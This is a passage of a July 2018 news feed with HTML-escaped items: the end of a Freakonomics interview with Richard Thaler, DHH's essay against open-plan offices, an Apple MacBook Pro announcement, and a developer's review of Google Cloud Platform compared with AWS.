&lt;p&gt;&lt;em&gt;&lt;span&gt;So, we don’t think people are dumb. We think the world is hard. I mean, figuring out how much to save for retirement is a really hard cognitive problem that very few economists have solved for themselves. And it’s not only cognitively hard, it involves delay of gratification, which people find hard. It’s just like navigating in a strange city is hard. So, why not try to help? When I first was working with the U.K. Behavioral Insight Team, the first “Nudge unit,” the phrase I kept saying in every meeting with some minister was, “If you want to get people to do something, make it easy. Remove the barriers.” That’s what we’re about.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Let me go back to you and the Nobel. So, what would you say have been the biggest changes in your life since winning the prize? Both of the observable sort and unobservable?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, I think I spend more time talking to people like you. My inbox, my email, is completely out of control. And there are some downsides. The university all of a sudden has a lot of things that they would like you to do.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Fundraisers.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Of that ilk. So, I was a pretty happy guy. You’ve known me for years. And we saw each other recently. Did I seem demonstrably happier?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: You looked a little taller and better-looking, but otherwise — I think that was my perception. I think you were exactly the same, actually.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: No, that was just your jealousy. But look, I absolutely don’t want to sound like a sore winner or an ungrateful winner. I’m saying that most of the people who win were already pretty successful people with pretty good lives. And there’s what psychologists call a ceiling effect. So I had a pretty happy life, as you know, I have a nice wife and I have kids I love. And yes, this made me happy. And it was very gratifying. But you have this image that you’re going to be on cloud nine. And then there is life, you still get flat tires even if you have a Nobel Prize. You still have leaks at home that nobody seems to be able to fix. So they need to fix that and say that if you get a Nobel Prize, nothing can leak in your house.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: I’ll end with where I should have started. Congratulations.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Thank you, Stephen.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: I know everybody who listens to you is happy for you, proud of you, and most of all, we’re pleased in a selfish way to keep learning from you, because we learn a lot. And I thank you especially for that. And I look forward to the next time we speak.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: So do I.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;*      *      *&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;Freakonomics Radio&lt;/span&gt;&lt;/em&gt; &lt;span&gt;is produced by Stitcher and Dubner Productions. This episode was produced by &lt;/span&gt;&lt;a href=&quot;https://twitter.com/elliswonk&quot;&gt;&lt;span&gt;Greg Rosalsky&lt;/span&gt;&lt;/a&gt;&lt;span&gt;. Our staff also includes&lt;/span&gt; &lt;a href=&quot;https://www.linkedin.com/in/alison-hockenberry-aa60315&quot;&gt;&lt;span&gt;Alison Hockenberry&lt;/span&gt;&lt;/a&gt;&lt;span&gt;, &lt;/span&gt;&lt;a href=&quot;https://www.linkedin.com/in/harry-huggins-72ba3232/&quot;&gt;&lt;span&gt;Harry Huggins&lt;/span&gt;&lt;/a&gt;,&lt;span&gt; &lt;a href=&quot;http://www.ripleyaudiopost.com/work&quot;&gt;&lt;span&gt;Greg Rippin&lt;/span&gt;&lt;/a&gt;, and&lt;/span&gt; &lt;a href=&quot;http://www.andymeisenheimer.com/&quot;&gt;&lt;span&gt;Andy Meisenheimer&lt;/span&gt;&lt;/a&gt;&lt;span&gt;. The music you hear throughout the episode was composed by&lt;/span&gt; &lt;a href=&quot;http://www.luisguerramusic.com/index.php&quot;&gt;&lt;span&gt;Luis Guerra&lt;/span&gt;&lt;/a&gt;&lt;span&gt;. You can subscribe to&lt;/span&gt; &lt;em&gt;&lt;span&gt;Freakonomics Radio&lt;/span&gt;&lt;/em&gt; &lt;span&gt;on&lt;/span&gt; &lt;a href=&quot;https://itunes.apple.com/podcast/freakonomics-radio/id354668519&quot;&gt;&lt;span&gt;Apple Podcasts&lt;/span&gt;&lt;/a&gt;&lt;span&gt;,&lt;/span&gt; &lt;a href=&quot;https://www.stitcher.com/podcast/freakonomics-radio&quot;&gt;&lt;span&gt;Stitcher&lt;/span&gt;&lt;/a&gt;&lt;span&gt;, or&lt;/span&gt; &lt;a href=&quot;http://freakonomics.com/about/where-to-listen-to-the-podcast/&quot;&gt;&lt;span&gt;wherever you get your podcasts&lt;/span&gt;&lt;/a&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;
&lt;div readability=&quot;5.1172413793103&quot;&gt;
&lt;p&gt;Here’s where you can learn more about the people and ideas in this episode:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SOURCES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Richard_Thaler&quot;&gt;&lt;span&gt;Richard Thaler&lt;/span&gt;&lt;/a&gt;, &lt;span&gt;professor of behavioral science and economics at the University of Chicago.&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;RESOURCES&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Thu, 12 Jul 2018 13:02:38 +0000</pubDate>
<dc:creator>dctoedt</dc:creator>
<og:type>article</og:type>
<og:title>People Aren’t Dumb. The World Is Hard. - Freakonomics</og:title>
<og:description>You wouldn’t think you could win a Nobel Prize for showing that humans tend to make irrational decisions. But that’s what Richard Thaler has done. The founder of behavioral economics describes his unlikely route to success; his reputation for being lazy; and his efforts to fix the world — one nudge at a time.</og:description>
<og:url>http://freakonomics.com/podcast/richard-thaler/</og:url>
<og:image>http://freakonomics.com/wp-content/uploads/2018/07/38005093095_72c4ed76f3_k-1024x861.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://freakonomics.com/podcast/richard-thaler/</dc:identifier>
</item>
<item>
<title>The open-plan office is a terrible, horrible, no good, very bad idea</title>
<link>https://m.signalvnoise.com/the-open-plan-office-is-a-terrible-horrible-no-good-very-bad-idea-42bd9cd294e3</link>
<guid isPermaLink="true" >https://m.signalvnoise.com/the-open-plan-office-is-a-terrible-horrible-no-good-very-bad-idea-42bd9cd294e3</guid>
<description>&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*zqIsv4OC0I8_Xn8G18aSSA.png&quot; data-width=&quot;2224&quot; data-height=&quot;1406&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*zqIsv4OC0I8_Xn8G18aSSA.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*zqIsv4OC0I8_Xn8G18aSSA.png&quot;/&gt;&lt;/div&gt;

&lt;p name=&quot;7ccd&quot; id=&quot;7ccd&quot; class=&quot;graf graf--p graf-after--h3&quot;&gt;Not because there aren’t people who actually enjoy working in an open office, there are. Quite a few, actually. But they’re in the distinct minority. The &lt;a href=&quot;https://twitter.com/dhh/status/1016755765359644672&quot; data-href=&quot;https://twitter.com/dhh/status/1016755765359644672&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;vast majority&lt;/a&gt; of people either dislike the open office or downright &lt;a href=&quot;https://twitter.com/angelsil_tpa/status/1016311498979897352&quot; data-href=&quot;https://twitter.com/angelsil_tpa/status/1016311498979897352&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;hate&lt;/a&gt; it. So how is that going to work, exactly?&lt;/p&gt;
&lt;p name=&quot;c613&quot; id=&quot;c613&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;By force, of course! Open offices are more appealing to people in management because they needn’t protect their own time and attention as much. Few managers have a schedule that allows, or even requires, long hours of uninterrupted time dedicated to a single creative pursuit.&lt;/p&gt;
&lt;p name=&quot;a99a&quot; id=&quot;a99a&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;And it’s these managers who are in charge of designing office layouts and signing leases. It’s also these managers who are responsible for booking photo shots of the FUN-FUN office, giving tours to investors, and fielding interviews with journalists. The open office is an excellent backdrop for all those activities.&lt;/p&gt;
&lt;p name=&quot;7b55&quot; id=&quot;7b55&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;What it isn’t, though, is conductive to better collaboration. A &lt;a href=&quot;http://rstb.royalsocietypublishing.org/content/royptb/373/1753/20170239.full.pdf&quot; data-href=&quot;http://rstb.royalsocietypublishing.org/content/royptb/373/1753/20170239.full.pdf&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;new study&lt;/a&gt; shows that the number one argument for the open office, increased collaboration, is bullshit. Converting traditional offices with walls and doors and separation into open-plan offices causes face-to-face interaction to plummet, not rise. People try to shield their attention (and sanity!) by retreating into headphone-clad cocoons, and instead rely on instant messaging or email to interact. D’oh!&lt;/p&gt;
&lt;p name=&quot;aa9e&quot; id=&quot;aa9e&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;My personal distaste for the open office goes back to the turn of the millennium when I worked at several tech companies with open-office layouts. It was a tyranny of interruption, distraction, and stress. The quality of my work suffered immensely, and so did my mental wellbeing. I feel quite comfortable stating that I would never have been able to create Ruby on Rails or any of my other software or creative achievements in such an environment.&lt;/p&gt;
&lt;p name=&quot;31aa&quot; id=&quot;31aa&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;One particular incident from those days stand out. We were already working from in open office, but at least I had a desk facing the wall behind me, so there was a modicum of privacy and psychological safety. Then management decided that it would “look better” if we went to circular desks where several of us would be sitting with our backs to the hallway, so everyone walking past would be looking at our screen as they passed. It took a minor rebellion that lasted several weeks before management backed down from that horrendous idea.&lt;/p&gt;
&lt;p name=&quot;e608&quot; id=&quot;e608&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Now, an open office is a continuum. The absolute worst is when you have dozens of people from all different departments in the same room. Sales, marketing, support, administration, programmers, designers, what have you. These departments have very different needs for quiet or concentration or use of phones or open conversation. Mixing them together is peak bad open office design.&lt;/p&gt;
&lt;p name=&quot;fc18&quot; id=&quot;fc18&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Less bad — but still not great — is to again have dozens of people in the same room, but from largely the same functions or complimentary ones. Programmers, designers, writers together. The problem here is that even within the same domain, different people will have very different sensibilities about what’s a reasonable level of conversation or interruption. Remember, there’s a sizable minority of even creative people who enjoy the open office!&lt;/p&gt;
&lt;p name=&quot;26ee&quot; id=&quot;26ee&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;And probably least bad is small team rooms of fewer than ten people, preferably fewer than six. I’ve sat together with really small teams before and that’s been OK. Some people who don’t like the open office at all might even still enjoy this configuration.&lt;/p&gt;
&lt;p name=&quot;99cc&quot; id=&quot;99cc&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;None of this is new. There’s been an &lt;a href=&quot;https://www.counterpunch.org/2017/11/29/architecture-of-the-office-and-the-open-plan-of-the-female-body/&quot; data-href=&quot;https://www.counterpunch.org/2017/11/29/architecture-of-the-office-and-the-open-plan-of-the-female-body/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;endless&lt;/a&gt; &lt;a href=&quot;https://www.newyorker.com/business/currency/the-open-office-trap&quot; data-href=&quot;https://www.newyorker.com/business/currency/the-open-office-trap&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;stream&lt;/a&gt; of studies showing that the open-plan office is a source of stress, conflict, and turnover. And yet it’s still the default in tech. An almost unquestioned default. That’s a fucking travesty.&lt;/p&gt;
&lt;p name=&quot;c23c&quot; id=&quot;c23c&quot; class=&quot;graf graf--p graf-after--p graf--trailing&quot;&gt;We’re squandering human health and potential on an epic scale by forcing the vast majority of people who dislike or hate the open office into that configuration. Their work deteriorates, their job satisfaction declines. And for what? Because a minority of people kinda like that configuration? Because it’ll look good in a few photos? Because it’ll impress strangers who visit the office? Get outta here.&lt;/p&gt;
</description>
<pubDate>Thu, 12 Jul 2018 12:42:34 +0000</pubDate>
<dc:creator>ingve</dc:creator>
<og:title>The open-plan office is a terrible, horrible, no good, very bad idea</og:title>
<og:url>https://m.signalvnoise.com/the-open-plan-office-is-a-terrible-horrible-no-good-very-bad-idea-42bd9cd294e3</og:url>
<og:image>https://cdn-images-1.medium.com/max/1200/1*zqIsv4OC0I8_Xn8G18aSSA.png</og:image>
<og:description>Not because there aren’t people who actually enjoy working in an open office, there are.</og:description>
<og:type>article</og:type>
<dc:format>text/html</dc:format>
<dc:identifier>https://m.signalvnoise.com/the-open-plan-office-is-a-terrible-horrible-no-good-very-bad-idea-42bd9cd294e3?gi=d7aeaf5b0f23</dc:identifier>
</item>
<item>
<title>MacBook Pro with faster performance and new features for pros</title>
<link>https://www.apple.com/newsroom/2018/07/apple-updates-macbook-pro-with-faster-performance-and-new-features-for-pros/</link>
<guid isPermaLink="true" >https://www.apple.com/newsroom/2018/07/apple-updates-macbook-pro-with-faster-performance-and-new-features-for-pros/</guid>
<description>&lt;p&gt;Cupertino, California — Apple today updated MacBook Pro with faster performance and new pro features, making it the most advanced Mac notebook ever. The new MacBook Pro models with Touch Bar feature 8th-generation Intel Core processors, with 6-core on the 15-inch model for up to 70 percent faster performance and quad-core on the 13-inch model for up to two times faster performance — ideal for manipulating large data sets, performing complex simulations, creating multi-track audio projects or doing advanced image processing or film editing.&lt;/p&gt;
&lt;p&gt;Already the most popular notebook for developers around the world, the new MacBook Pro can compile code faster and run multiple virtual machines and test environments easier than before. Additional updates include support for up to 32GB of memory, a True Tone display and an improved third-generation keyboard for quieter typing. And with its powerful Radeon Pro graphics, large Force Touch trackpad, revolutionary Touch Bar and Touch ID, dynamic stereo speakers, quiet Apple-designed cooling system and Thunderbolt 3 for data transfer, charging and connecting up to two 5K displays or four external GPUs, it’s the ultimate pro notebook.&lt;/p&gt;
</description>
<pubDate>Thu, 12 Jul 2018 12:38:31 +0000</pubDate>
<dc:creator>briandear</dc:creator>
<og:type>article</og:type>
<og:title>Apple updates MacBook Pro with faster performance and new features for pros</og:title>
<og:description>Apple today updated MacBook Pro with faster performance and new pro features, making it the most advanced Mac notebook ever.</og:description>
<og:url>https://www.apple.com/newsroom/2018/07/apple-updates-macbook-pro-with-faster-performance-and-new-features-for-pros/</og:url>
<og:image>https://www.apple.com/newsroom/images/product/mac/standard/Apple_MacBook_Pro-update_13in_15in_07122018_LP_hero.jpg.og.jpg?201807122303</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.apple.com/newsroom/2018/07/apple-updates-macbook-pro-with-faster-performance-and-new-features-for-pros/</dc:identifier>
</item>
<item>
<title>Google Cloud Platform – The Good, Bad, and Ugly</title>
<link>https://www.deps.co/blog/google-cloud-platform-good-bad-ugly/</link>
<guid isPermaLink="true" >https://www.deps.co/blog/google-cloud-platform-good-bad-ugly/</guid>
<description>&lt;p&gt;Deps is a private, hosted, Maven repository. While building it I had a critical decision to make - Where to host it? I evaluated many different hosting services but decided on Google Cloud Platform (GCP). I’ve been using it in pre-production and then production for over a year and a half now. I haven’t seen too many experience reports on Google Cloud, so I wanted to share how I’ve found it, what went well, and what still needs improving. I’ve split my thoughts below into good, meh, bad, ugly, and opportunities for improvement. I have compared and contrasted with Amazon Web Services (AWS), the other hosting provider that I have the most experience with, and GCP’s biggest competitor.&lt;/p&gt;
&lt;p&gt;A note up front, these are solely my experiences, and it’s quite possible that I’ve misunderstood or misrepresented things here. If I’ve made any mistakes, let me know so I can correct them. I only talk about services that I have experience using. There are a bunch of really good looking services like Google Kubernetes Engine, Google App Engine, and BigQuery, but I haven’t used them enough (or at all) to be able to give a review on them.&lt;/p&gt;

&lt;h2 id=&quot;permissions&quot;&gt;Permissions&lt;/h2&gt;
&lt;p&gt;Google Cloud’s permission model is one of its strongest features. AWS IAM permissions are fairly complicated; in practice people often set permissions to &lt;code&gt;s3:*&lt;/code&gt; or equivalent to make things work. For this reason (and others) there has become a ‘best-practice’ of running multiple AWS accounts for dev, staging, and prod, and &lt;a href=&quot;https://segment.com/blog/secure-access-to-100-aws-accounts/&quot;&gt;maybe more environments&lt;/a&gt;. AWS seems to be okay with this situation and is leaning into it, offering &lt;a href=&quot;https://aws.amazon.com/about-aws/whats-new/2018/06/introducing-aws-landing-zone/&quot;&gt;AWS Landing Zone&lt;/a&gt; and &lt;a href=&quot;https://aws.amazon.com/organizations/&quot;&gt;Organisations&lt;/a&gt; to help orchestrate multiple accounts. This works, but it seems like it adds a lot of complexity.&lt;/p&gt;
&lt;p&gt;In contrast, GCP offers a much simpler starting point: Projects. Every resource you create (I think?) lives in a Project, and Projects live inside your (single) Organisation. By default, resources within a Project are accessible to other resources in that Project (as long as their API is enabled) and are inaccessible to anything outside of the project. For example, if you create a Cloud SQL database and a Cloud Storage bucket, by default a VM inside the project can access both resources, but a VM outside of the project couldn’t. This goes a long way towards setting up safe permission structures. If you need to, you can setup inter-project resource access, but it’s not something you’re likely to need too much. In my experience, I needed it for accessing disk images and DNS records, but everything else for Deps’ production service lives isolated in the production project.&lt;/p&gt;
&lt;p&gt;Google’s Organisation management offers &lt;a href=&quot;https://cloud.google.com/resource-manager/docs/creating-managing-folders&quot;&gt;hierarchical folders&lt;/a&gt; with cascading permissions. I haven’t needed to use them, but it seems like this would scale well to very large organisations. I wonder if this is modelled on the way Google’s internal permission system works?&lt;/p&gt;
&lt;h2 id=&quot;product-philosophy&quot;&gt;Product Philosophy&lt;/h2&gt;
&lt;p&gt;GCP has quite a different product philosophy to AWS. When new GCP features and resources are released into general availability, they are usually very high quality. This is in contrast to AWS where it can sometimes feel like you are the first person to use a feature. A quote I have seen which rings true to me is &lt;a href=&quot;https://news.ycombinator.com/item?id=17025561&quot;&gt;“Google’s Beta is like AWS’s GA”&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;GCP also has done well with integrating their different services together. GCP provides a smaller set of core primitives that are global and work well for lots of use cases. &lt;a href=&quot;https://cloud.google.com/pubsub/&quot;&gt;Pub/Sub&lt;/a&gt; is probably the best example I have for this. In AWS you have SQS, SNS, Amazon MQ, Kinesis Data Streams, Kinesis Data Firehose, DynamoDB Streams, and maybe another queueing service by the time you read this post. GCP has Pub/Sub. Pub/Sub seems flexible enough to replace most (all?) of AWS’ various queues. (Disclaimer, I haven’t used Pub/Sub yet, just looked at its documentation).&lt;/p&gt;
&lt;p&gt;Google opts for strong consistency by default. Google Cloud Storage, has &lt;a href=&quot;https://cloudplatform.googleblog.com/2018/02/how-Google-Cloud-Storage-offers-strongly-consistent-object-listing-thanks-to-Spanner.html&quot;&gt;consistent&lt;/a&gt; lists and gets, Cloud Key Management Service has strong (global) consistent key enablement, and Cloud Spanner is their globe-spanning consistent database. Many AWS services are eventually consistent, which pushes complexity onto the developer.&lt;/p&gt;
&lt;p&gt;Even though Google has a smaller set of primitives than AWS, they are often simpler. Rather than having dozens of compute instance types, they offer just four: micro, standard, highmem, and highcpu. In actual fact, these are all just pre-configurations in the design space, and you can size and configure your instances to be just about any combination of memory and CPU.&lt;/p&gt;
&lt;p&gt;Another small thing, but one that I appreciated is that GCP’s resource names are often aesthetically prettier. Either you get to name resources yourself (I’m looking at you &lt;code&gt;jfkjfkfjlkjfjfkak.cloudfront.net&lt;/code&gt;), or the generated names are short, e.g. &lt;code&gt;&amp;lt;instance-prefix&amp;gt;-cjgh&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;global-and-regional-by-default&quot;&gt;Global and Regional by default&lt;/h2&gt;
&lt;p&gt;One of the nicest things about GCP is that most resources are either global or regional. This includes things like the control panel (you can see all of your project’s VMs on a single screen), disk images, storage buckets (multi-region within a continent), network configuration, global load balancing, Pub/Sub, VPC networks, and probably more I’m forgetting. This contrasts with AWS, where most resources, including the control panel, are either zonal or regional.&lt;/p&gt;
&lt;h2 id=&quot;compute-engine&quot;&gt;Compute Engine&lt;/h2&gt;
&lt;p&gt;Google Compute Engine has been very solid for me. I’m only using it for a handful of VMs but I haven’t noticed any issues with it. The instance group managers work well and auto-scaling does what it’s meant to do. &lt;a href=&quot;https://cloud.google.com/compute/docs/load-balancing/health-checks&quot;&gt;Health checks&lt;/a&gt; can be used to destroy unhealthy instances and create new ones without manual intervention (this has pros and cons, as you may lose debugging information). &lt;a href=&quot;https://cloud.google.com/compute/docs/instance-groups/updating-managed-instance-groups&quot;&gt;Rolling updates&lt;/a&gt; work well for doing deployments. The Rolling Update manager waits for new instances to be healthy before shutting down old instances. This has helped catch a few issues before they hit production. If your instance is unhealthy, GCP provides &lt;a href=&quot;https://cloud.google.com/compute/docs/instances/live-migration&quot;&gt;live instance migration&lt;/a&gt;. It’s nice, it seems to happen once/twice a week, and I’ve never noticed any issues with it. On AWS, &lt;a href=&quot;https://aws.amazon.com/maintenance-help/&quot;&gt;maintenance events&lt;/a&gt; will require a reboot.&lt;/p&gt;
&lt;p&gt;Google’s pricing model is much simpler. As mentioned above, you can preconfigure your machines to just about any combination of memory and CPU that makes sense for your application. You can also pick your Intel CPU instance family if you need certain CPU features, or just want the slight performance boost available.&lt;/p&gt;
&lt;p&gt;For standard VMs, Google offers &lt;a href=&quot;https://cloud.google.com/compute/docs/sustained-use-discounts&quot;&gt;Sustained Use Discounts&lt;/a&gt;. If you run a standard VM for more than 25% of a month, Compute Engine automatically discounts your bill. If you run an instance for a full month this ends up to be a 30% discount. This is a nice benefit if you don’t want to pre-purchase capacity, but still have a stable workload. They even do something neat with ‘inferred instances’ where they bin-pack partial instance usage. This means you don’t lose your discount if you replace instances through the month, and ends up giving you the maximum possible discount. I can’t do it justice here, check out the docs, it’s really cool.&lt;/p&gt;
&lt;p&gt;Google’s answer to AWS spot pricing is &lt;a href=&quot;https://cloud.google.com/compute/docs/instances/preemptible&quot;&gt;Preemptible Instances&lt;/a&gt;. Instead of bidding on instances and working out the maximum price you’re willing to pay, they offer a single, fixed 80% discount. One thing that is trickier with Preemptible Instances is that you only get a 30-second warning before your instance is preempted. On AWS you get two minutes. The tradeoff is that both pre-emptible and standard instance startup times are faster because Google can evict Preemptible Instances more quickly. On AWS, after submitting a spot request you may have to wait a short time before your spot request is fulfilled.&lt;/p&gt;
&lt;p&gt;Lastly, Google has an answer to Amazon’s Reserved Instances, and again they are much simpler. To use &lt;a href=&quot;https://cloud.google.com/compute/docs/instances/signing-up-committed-use-discounts&quot;&gt;Committed Use Discounts&lt;/a&gt;, you purchase vCPUs and memory capacity separately. Your purchase is tied to a region but is otherwise convertible to just about any instance configuration (see the docs for a few small limitations). Committed Use Discounts are automatically applied to the instances you are running in your workload, and then Sustained Use Discounts are applied to any resource usage on top of that.&lt;/p&gt;
&lt;h2 id=&quot;terraform&quot;&gt;Terraform&lt;/h2&gt;
&lt;p&gt;Picking Terraform has been a really big win for Deps. It enables us to quickly and safely spin up a complete staging or development environment to test a risky infrastructure change. It also ensures that changes to production are tracked, commented, and coherent as a whole. Terraform takes a little bit of learning, but the &lt;a href=&quot;https://www.terraform.io/docs/providers/google/index.html&quot;&gt;Google Cloud Provider docs&lt;/a&gt; are really good, and the team working on the provider is constantly updating it with new features and resources in GCP. If you want to be on the bleeding edge of every GCP feature then Terraform may not be a good fit for you, as they don’t generally support beta resources. However you could manage those beta resources via the console/CLI/&lt;a href=&quot;https://cloud.google.com/deployment-manager/&quot;&gt;Deployment Manager&lt;/a&gt; until Terraform support is added, then &lt;a href=&quot;https://www.terraform.io/docs/import/index.html&quot;&gt;import&lt;/a&gt; them into your Terraform config.&lt;/p&gt;
&lt;p&gt;The one place I think Terraform has room to improve is in running multiple environments from a single configuration, e.g. dev, staging, prod. &lt;a href=&quot;https://www.terraform.io/docs/state/workspaces.html&quot;&gt;Workspaces&lt;/a&gt; are good, but there is limited support for switching variables based on your workspace.&lt;/p&gt;
&lt;h2 id=&quot;networking-and-firewalls&quot;&gt;Networking and Firewalls&lt;/h2&gt;
&lt;p&gt;Network and firewall configuration was simple and easy. The default networking decisions seemed good to me. However, I’m not running enough instances to run into any problems here. Google’s networks are global by default and enable inter-region communication with no extra setup or costs. On AWS, you need to run a &lt;a href=&quot;https://docs.aws.amazon.com/AmazonVPC/latest/UserGuide/vpc-nat-comparison.html&quot;&gt;NAT instance or NAT gateway&lt;/a&gt; for inter-region VPC communication.&lt;/p&gt;
&lt;h2 id=&quot;google-cloud-slack&quot;&gt;Google Cloud Slack&lt;/h2&gt;
&lt;p&gt;The &lt;a href=&quot;https://gcp-slack.appspot.com/&quot;&gt;Google Cloud Platform Slack&lt;/a&gt; has been invaluable. There are many GCP engineers in the channels for their products. The Googlers and customers are both very helpful. You can glean bits of inside gossip, survey invites, and early access to beta programs. It is also helpful for debugging whether a problem is specific to your infrastructure, or whether it is a wider problem affecting others. More on that later.&lt;/p&gt;
&lt;h2 id=&quot;console&quot;&gt;Console&lt;/h2&gt;
&lt;p&gt;Google’s console looks much nicer than AWS. Because it is tied to my Google account, I don’t need to log-in with my 2FA key every day, where I do with AWS. The Console is well designed and laid out in a logical manner. It helps in this case that Google doesn’t have the same number of services that AWS has. You can pin any number of services that you use to a sidebar menu. I imagine as their offering grows, they may need to redesign the sidebar further. The Console is global, not regional, so you can see resources across all regions in a single ‘pane of glass’ for a project (apart from acquired companies, more below). No more wondering “Did I leave an instance running in us-east-2?”.&lt;/p&gt;
&lt;h2 id=&quot;google-cloud-storage-gcs&quot;&gt;Google Cloud Storage (GCS)&lt;/h2&gt;
&lt;p&gt;I almost forgot to put GCS in this article because it is so reliable that it fades into the background. Most of the time I don’t really think about it. Multi-region storage is really nice if you can wear the slight latency hit. It makes it easier to run in multiple regions, something that is in Deps’ future plans to improve availability. GCS supports the S3 API without having to run an S3 Proxy like &lt;a href=&quot;https://www.microsoft.com/developerblog/2016/05/22/access-azure-blob-storage-from-your-apps-using-s3-api/&quot;&gt;Azure&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;logging&quot;&gt;Logging&lt;/h2&gt;
&lt;p&gt;Logging is fast, and easy to query. I’ve had good experiences with this, although my needs have been fairly modest. All of the GCP services emit structured logs which is easy to query against. One downside is that log exports to GCS aren’t signed, and it doesn’t seem like you can verify that logs haven’t been tampered with. If anyone knows of a way to verify the logs, I’d love to know about it.&lt;/p&gt;
&lt;h2 id=&quot;public-feedback&quot;&gt;Public Feedback&lt;/h2&gt;
&lt;p&gt;Google has a public issue tracker at &lt;a href=&quot;https://issuetracker.google.com&quot;&gt;https://issuetracker.google.com&lt;/a&gt;. Google employees mostly respond to issues with a “thanks for your feedback, we’ll take it under advisement” but it’s good that it exists, and sometimes they will ask clarifying questions, which shows that they do care. They also have a &lt;a href=&quot;https://googlecloudplatform.uservoice.com/forums/299943--google-cloud-platform&quot;&gt;UserVoice&lt;/a&gt; for feedback and many mailing lists. It would be nice if there was a unified view of all of the mailing list/forums like AWS has. It’s not always clear what mailing lists are available. &lt;strong&gt;Update:&lt;/strong&gt; jjjjoe on &lt;a href=&quot;https://news.ycombinator.com/item?id=17517157&quot;&gt;Hacker News&lt;/a&gt; pointed me to &lt;a href=&quot;https://cloud.google.com/support/docs/groups&quot;&gt;https://cloud.google.com/support/docs/groups&lt;/a&gt; which aggregates all of the mailing lists available.&lt;/p&gt;
&lt;h2 id=&quot;security&quot;&gt;Security&lt;/h2&gt;
&lt;p&gt;Security was one of the main reasons that I chose a major cloud provider over a more niche host. Security is baked into everything Google does, starting with securing your Google account. Google has a good whitepaper covering their &lt;a href=&quot;https://cloud.google.com/security/encryption-in-transit/&quot;&gt;encryption in transit&lt;/a&gt;. It is nice that cross-region traffic is &lt;a href=&quot;https://news.ycombinator.com/item?id=15916118&quot;&gt;encrypted&lt;/a&gt;, as that’s one less thing to have to set up that you would need to do on AWS. Most services offer encryption by default, and your only choice is if you use Google’s keys or your own. I was recently setting up some S3 buckets and was surprised to see they still offered the option to have unencrypted buckets.&lt;/p&gt;
&lt;p&gt;Google’s Metadata service requires adding a specific HTTP header for it to respond. This prevents &lt;a href=&quot;https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/&quot;&gt;Server Side Request Forgery&lt;/a&gt;, which is welcome.&lt;/p&gt;

&lt;p&gt;These are services that I’ve had an OK experience with. I wouldn’t strongly recommend them, but they’re not bad either.&lt;/p&gt;
&lt;h2 id=&quot;container-builder&quot;&gt;Container Builder&lt;/h2&gt;
&lt;p&gt;Container Builder is a tool for building containers and running Continous Integration (CI). Because it was a container building tool first, it can be a bit tricky to understand how you can use it to run CI. It is missing a lot of features that come standard with other CI tools like Circle CI or Travis CI, e.g. build caching, GitHub status notifications, Slack test failure notifications, running a sidecar container for a database. None of these individually is too hard to roll yourself, but it would be nicer if they came built-in.&lt;/p&gt;
